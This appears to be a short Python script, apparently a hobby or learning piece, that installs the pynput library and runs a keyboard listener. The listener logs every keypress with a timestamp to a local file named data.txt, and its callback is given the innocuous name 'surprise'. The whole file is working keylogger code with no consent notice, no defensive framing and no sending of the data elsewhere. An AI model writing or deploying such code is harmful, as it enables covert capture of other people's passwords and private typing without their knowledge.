import setupp

modules_used = ["pynput"]
setupp.inp(modules_used)


from pynput import keyboard
from pynput.keyboard import Key
from datetime import datetime

def surprise(key):
    with open("data.txt","a") as file:
        try:
            now = datetime.now()
            k = str(key)
            file.write(str(now)+" : ")
            file.write(k)
            file.write('\n')

        except:
            print("Can't convert")

if __name__ == "__main__":
    logger = keyboard.Listener(on_press=surprise)
    logger.start()
    input()